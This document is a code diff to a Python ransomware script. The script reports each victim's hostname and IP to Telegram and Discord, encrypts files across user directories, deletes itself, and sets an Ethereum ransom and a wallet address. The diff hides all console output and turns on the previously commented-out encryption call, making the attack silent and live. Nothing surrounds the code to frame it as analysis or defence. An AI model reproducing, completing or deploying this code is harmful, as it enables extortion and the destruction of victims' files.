@@ -21,9 +21,10 @@ def delete_script():
     script_path = os.path.abspath(sys.argv[0])
     try:
         os.remove(script_path)
-        print(f"Script '{script_path}' deleted successfully.")
+        #print(f"Script '{script_path}' deleted successfully.")
     except Exception as e:
-        print(f"Error deleting script: {e}")
+        #print(f"Error deleting script: {e}")
+        pass
 
 hostname = socket.gethostname()
 IPAddr = socket.gethostbyname(hostname)
@@ -50,9 +51,10 @@ def download_file(url, filename):
         with open(file_path, 'wb') as f:
             f.write(response.content)
         
-        print(f"File downloaded successfully to {file_path}")
+        #print(f"File downloaded successfully to {file_path}")
     except requests.exceptions.RequestException as e:
-        print("Error downloading the file:", e)
+        #print("Error downloading the file:", e)
+        pass
 
 def get_folder_size(folder_path):
     # Function to calculate the total size of a folder and its subfolders
@@ -94,7 +96,7 @@ def send_message(content):
     bot.sendMessage(Tel_room, content)
     webhook = DiscordWebhook(url=D_Token, content=content)
     webhook.execute()
-    print (f"Message sent.")
+    #print (f"Message sent.")
 
 send_message(f"Computer {hostname} has ran the script. IP = {IPAddr}")
 
@@ -110,7 +112,8 @@ def encrypt_folder(folder_path, key):
             try:
                 encrypt_file(file_path, key)
             except Exception as e:
-                print(f"Failed to encrypt {file_path}: {e}")
+                #print(f"Failed to encrypt {file_path}: {e}")
+                pass
 
 def encrypt_file(file_path, key):
     global number_of_encrypts
@@ -160,7 +163,7 @@ def encrypt_file(file_path, key):
     # Replace the original file with the encrypted file
     shutil.move(encrypted_file_path, file_path)
     number_of_encrypts = number_of_encrypts+1
-    print("Encryption successful. Original file encrypted:", file_path)
+    #print("Encryption successful. Original file encrypted:", file_path)
 
 
 
@@ -180,10 +183,11 @@ def create_text_file_on_desktop(file_name, content=''):
         with open(file_path, 'w') as file:
             file.write(content)
 
-        print(f"Text file '{file_name}' created successfully on the desktop.")
+        #print(f"Text file '{file_name}' created successfully on the desktop.")
 
     except Exception as e:
-        print(f"An error occurred: {e}")
+        pass
+        #print(f"An error occurred: {e}")
 
 
 
@@ -228,12 +232,12 @@ directories = {
 
 def encrypt_files():
    encryption_key = int(''.join(str(random.randint(0, 9)) for _ in range(24)))
-   print (encryption_key)
+   #print (encryption_key)
    for folder_name, folder_path in directories.items():
         folder_size = get_folder_size(folder_path)
         encryption_size = get_encryption_size(directories=directories)
         send_message(f"Attempting to encrypt '{folder_name}' directory with a total size of '{folder_size}'")
-        #encrypt_folder(folder_path=folder_path, key=str(encryption_key))
+        encrypt_folder(folder_path=folder_path, key=str(encryption_key))
    eth_amount = (f"0.0{random.randint(6,8)}ETH")
    day_amount = (f"{random.randint(2,4)}")
    crypto_wallet = r"0xA8751bcE4ca787CE8d630727F048592dD03B9A5A"
